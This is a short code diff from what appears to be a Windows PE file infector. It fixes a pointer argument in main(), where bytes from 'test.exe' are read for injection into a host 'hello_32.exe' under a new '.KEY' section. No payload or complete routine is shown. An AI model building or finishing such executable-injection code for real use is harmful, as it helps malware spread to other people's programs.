@@ -67,7 +67,7 @@ bool addCode(wchar_t* filename,BYTE* byte_infected,unsigned sizeInfected) {
 int main() {
 	wchar_t file_infect[] = L"test.exe";
 	unsigned size;
-	BYTE* byte_infected = get_infected_byte(file_infect,size);
+	BYTE* byte_infected = get_infected_byte(file_infect,&size);
 	
 	wchar_t file_host[] = L"hello_32.exe";
 	char sec[] = ".KEY";
